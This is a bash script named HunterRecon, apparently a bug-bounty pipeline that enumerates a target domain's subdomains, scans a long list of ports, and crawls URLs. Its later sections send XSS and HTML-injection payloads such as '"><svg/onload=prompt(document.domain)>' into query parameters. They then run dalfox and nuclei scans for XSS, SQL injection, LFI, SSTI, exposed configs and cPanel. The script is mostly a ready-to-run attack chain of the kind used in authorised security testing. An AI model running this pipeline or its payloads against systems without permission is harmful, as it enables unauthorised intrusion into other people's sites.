#!/bin/bash

site=$1
ports="21,22,23,25,53,69,80,88,110,115,123,137,139,143,161,179,194,389,443,445,465,500,546,547,587,636,993,994,995,1025,1080,1194,1433,1434,1521,1701,1723,1812,1813,2049,2222,2375,2376,3306,3389,3690,4443,5432,5800,5900,5938,5984,6379,6667,6881,8080,8443,8880,9090,9418,9999,10000,11211,15672,27017,28017,3030,33060,4848,5000,5433,5672,6666,8000,8081,8444,8888,9000,9042,9160,9990,11210,12201,15674,18080,1965,1978,2082,2083,2086,2087,2089,2096,22611,25565,27018,28015,33389,4369,49152,54321,54322,55117,55555,55672,5666,5671,6346,6347,6697,6882,6883,6884,6885,6886,6887,6888,6889,8088,8089,9001,9415,17089,27019,34443,3659,45557,55556,5673,5674,6370,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,81,300,591,593,832,981,1010,1311,1099,2095,2480,3000,3128,3333,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8083,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8834,8983,9043,9060,9080,9091,9200,9443,9502,9800,9981,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,22222"
hav=false
alp=false

function banner {
        clear
        figlet -c -f slant HunterRecon | lolcat
        echo
}
banner

if echo $* | grep '\-h' -q;then
        echo "HunterRecon: Help"
        echo '-th:      Use theHarvesterTool'
        echo '-all-apis:      Use -all of subfinder'
        exit;
fi
if echo $* | grep '\-th' -q;then
        hav=true
fi
if echo $* | grep '\-all-apis' -q;then
        alp=true
fi

echo "===== Subdomains Recon ====="
sublist3r -d $site -o subs.rs
shodanx subdomain -d $site -o shodan-subs.rs ; cat shodan-subs.rs | grep $site | anew subs.rs
echo $site | assetfinder --subs-only | anew subs.rs
findomain -t $site -q | anew subs.rs
echo $site | haktrails subdomains | anew subs.rs
chaos-client -d $site --silent | anew subs.rs

if $alp;then
        banner
        echo "===== Subfinder (APIS) Recon ====="
        subfinder -d $site --silent -all | anew subs.rs
else
        subfinder -d $site --silent | anew subs.rs
fi
if $hav;then
        banner
        echo "===== TheHarvester Recon ====="
        theHarvester -d $site -l 500 -b all -s -f havt
        cat havt.json | jq '."hosts".[]' | tr -d '"' | tr ':' '\n' | grep $site$ | anew subs.rs
        cat havt.json | jq '."emails".[]' | tr -d '"' | tr ':' '\n' | anew emails.txt
fi

### NUCLEI SSL NAMES RECON && WILLCARDS ###
banner
echo "==== SSL Names (Nuclei) ====="
echo ; sleep 3
cat subs.rs | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml -c 170 -o ssl-names.nucl --silent
cat ssl-names.nucl | awk '{ print $5 }' | tr -d '["]' | tr ',' '\n' | grep $site$ | anew subs.rs
##############################

### WILLCARDS RECON ###
cat subs.rs | grep '^*.' | sed 's/*\.//' | sed 's/^'$site'//' | anew willcards.rs

nw=$(cat willcards.rs | wc -l)
if [[ $nw > 0 ]];then
        banner
        echo "===== Wilcards Recon ====="
        cat willcards.rs | subfinder -o willcards-subs.rs --silent
fi

if [[ -f willcards-subs.rs ]];then
        cat willcards-subs.rs | anew subs.rs
fi
#######################

banner
echo "===== Atives && IPS Recon ====="
cat subs.rs | httpx -t 100 --silent | anew vivos.rs
cat subs.rs | dnsx -a --resp-only --silent | anew ips.rs
cat subs.rs | dnsx -a --resp --silent | anew dips.rs
cat vivos.rs | httpx --silent -td --title | anew techs.rs
naabu -list ips.rs -p $ports -c 150 -o naabu-full.txt
cat naabu-full.txt | httpx --silent -t 100 | anew vivos.rs

banner
echo "===== URL Recon ====="
cat vivos.rs | katana -ef jpg,jpeg,woff,woff2,ico,gif --passive -o urls.cd
paramspider -d $site ; cat output/* | anew params.cd
rm -rf output/

cat vivos.rs | gauplus -b jpg,jpeg,woff,woff2,ico,gif | anew urls.cd
cat vivos.rs | waybackurls | anew urls.cd
cat vivos.rs | hakrawler | anew urls.cd

banner
echo "===== PHPINFO Recon & Git Exposed ====="
cat vivos.rs | nuclei -tags phpinfo,git,env -c 125 --silent -o gitphpinfo.nucl

banner
echo "===== Param Recon ====="
cat urls.cd | grep '?' | qsreplace 'FUZZ' | anew params.cd
cat params.cd | gf xss | anew xss.gf
cat params.cd | gf sqli | anew sqli.gf
cat params.cd | gf redirect | anew redirect.gf
cat params.cd | gf idor | anew idor.gf
cat params.cd | gf lfi | anew lfi.gf

banner
echo "===== Param Attacks ====="
cat params.cd | qsreplace 'kalirfl' | httpx -ms 'kalirfl' -o refletidos.cd -t 125
cat refletidos.cd | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew airi.xss
cat refletidos.cd | qsreplace '"><img src=x onerror=confirm()>' | airixss -p 'confirm()>' | egrep -v 'Not' | anew airi.xss
cat refletidos.cd | qsreplace '"><h1 onclick=prompt()>its me</h1>' | airixss -p 'its me</h1>' | egrep -v 'Not' | anew airi.htmli
cat refletidos.cd | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew airi.htmli

cat airi* | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > vuln-injections.txt

banner
echo "===== Dalfox XSS ====="
cat vuln-injections.txt | qsreplace | dalfox pipe --skip-bav --silence -o dalfox.xss

banner
echo "===== cPanel Attacks ====="
cat vivos.rs | grep '2082\|2083\|2086\|2087\|2089\|2095\|2096' > cpanel.txt
nuclei -list cpanel.txt -tags cpanel -c 150 -o nuclei-cpanel.nucl --silent

banner
echo "===== Nuclei Scan ====="
mkdir Nuclei-Tests

cat vivos.rs | nuclei -t ~/nco/nucl-ant/ -es info --silent -o nuclei-old-scan.nucl -c 150
cat vivos.rs | nuclei -tags exposure,config --silent -o nuclei-exposure-scan.nucl -c 150
cat vivos.rs | nuclei -tags xss,sqli,lfi,ssti,csrf,crlf -es info --silent -o nuclei-tags.nucl -c 150
cat vivos.rs | nuclei -tags swagger --silent -o nuclei-swagger.nucl -c 150

mv *.nucl Nuclei-Tests/
